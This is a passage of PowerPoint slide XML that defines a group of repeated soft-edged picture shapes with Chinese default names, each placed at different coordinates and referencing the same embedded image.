            <p:spPr>
              <a:xfrm>
                <a:off x="8981304" y="1414600"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="24" name="图片 23">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC1D1626-2F25-1045-963F-A8CE4B51F8C4}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9572319" y="1789537"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="25" name="图片 24">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{975772C0-98F7-2242-8CF1-7C26D3EC0CCC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8602163" y="1982264"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="26" name="图片 25">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00BC5729-9DCF-5A42-83B1-214D29B0065B}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9225929" y="2691147"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="27" name="图片 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A85FCEEC-CA10-3343-90A4-E0BCE3D7F0B0}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10016245" y="2691147"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="28" name="图片 27">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF2A0933-1FCE-514F-884D-B953C16DA611}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8992612" y="2250961"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="29" name="图片 28">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{890A008F-F5BE-E141-8B75-859E986E2565}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9583627" y="2625898"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="30" name="图片 29">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2AF9829-ADFC-3240-A915-EA237E5941FE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9237237" y="3527508"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="31" name="图片 30">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FAEACE5B-0D07-7441-BB68-C83C04A586F2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10027553" y="3527508"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="32" name="图片 31">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D97E575-46D3-8B4F-B78D-73C0BC1FC6E5}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8979044" y="3035301"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="33" name="图片 32">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2AEA5253-3559-3A48-B8C2-DA3F7A2C4972}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9570059" y="3410238"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="34" name="图片 33">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18CE4344-95DB-F04F-A4DB-56AFD0D936F9}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8599903" y="3602965"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="35" name="图片 34">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7EF721D1-A7B3-714B-9232-7AFE1C773F68}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9234820" y="4189187"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="36" name="图片 35">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01329731-343B-A647-963D-D527C0BD5C6D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10013985" y="4311848"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="37" name="图片 36">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{43161C62-872C-0B45-891B-D117067BF8DE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10136197" y="1621094"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="38" name="图片 37">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF3DD16F-FDD0-1444-B7F5-39E7D3C023FE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10727212" y="1996031"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="39" name="图片 38">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{780769D2-AF7E-1F44-AE19-920F3120E7D2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9757056" y="2188758"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="40" name="图片 39">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FFA23AF-300E-BE4D-9010-53ABA6B43489}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10380822" y="2897641"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="41" name="图片 40">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B9684466-8530-6940-9DAF-EB7C356E6899}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11171138" y="2897641"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="42" name="图片 41">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74FAE815-47B9-3D4D-91BA-5BC02D3AE43B}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10777959" y="3329171"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="43" name="图片 42">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA6B6110-45A7-8147-8365-C961127C90C1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11368974" y="3704108"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="44" name="图片 43">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{969D5064-7280-0D47-9401-9D8D8B403840}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10398818" y="3896835"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="45" name="图片 44">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{159E3003-3A58-DD41-A24B-1C7286D746E2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11022584" y="4605718"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="46" name="图片 45">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BBD5DE65-0BDA-5B4D-9B6D-C182E86E2EFF}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8770446" y="4242292"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="47" name="图片 46">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F15F0B7-2552-CA4A-8129-C3FDE1226400}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9361461" y="4617229"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="48" name="图片 47">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02860476-9C74-114A-ADCE-A3D17A131A00}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8638376" y="4843308"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="49" name="图片 48">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF176C75-917A-014D-86DF-032102BB412A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9015071" y="5518839"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="50" name="图片 49">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C59153FC-7629-684E-A937-622BA1CD9133}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10482587" y="4337021"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="51" name="图片 50">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A0AAFBB7-F94D-DD42-9E5C-849F9FCF09AA}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10136197" y="5238631"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="49161" name="组合 51"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4791721" y="3837753"/>
              <a:ext cx="1304820" cy="769602"/>
